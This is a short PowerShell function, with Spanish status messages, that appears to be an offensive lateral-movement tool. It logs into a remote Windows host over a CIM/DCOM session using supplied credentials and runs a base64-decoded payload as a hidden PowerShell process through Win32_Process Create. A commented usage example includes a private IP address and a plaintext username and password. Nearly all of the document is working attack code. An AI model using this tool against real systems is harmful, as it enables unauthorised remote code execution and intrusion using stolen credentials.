function Invoke-WinRM {
    param(
        [Parameter(Mandatory = $true)]
        [string]$TargetIP,

        [Parameter(Mandatory = $true)]
        [string]$Username,

        [Parameter(Mandatory = $true)]
        [string]$Password,

        [Parameter(Mandatory = $true)]
        [string]$PayloadBase64
    )

    Write-Host "[*] Generando credenciales..."
    $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword)

    Write-Host "[*] Estableciendo sesión CIM con $TargetIP ..."
    $SessionOptions = New-CimSessionOption -Protocol DCOM
    try {
        $CimSession = New-CimSession -ComputerName $TargetIP -Credential $Cred -SessionOption $SessionOptions
        Write-Host "[+] Sesión establecida con $TargetIP. Ejecutando payload..."
    } catch {
        Write-Host "[-] Error al establecer la sesión CIM: $_"
        return
    }

    $Decoded = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($PayloadBase64))

    Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="powershell -nop -w hidden -c \"$Decoded\""} | Out-Null

    Write-Host "[+] Payload ejecutado exitosamente en $TargetIP"
    $CimSession | Remove-CimSession
}

# Ejemplo de uso:
# $payload = '<BASE64_PAYLOAD>'
# Invoke-WinRM -TargetIP "192.168.109.72" -Username "jen" -Password "Nexus123!" -PayloadBase64 $payload
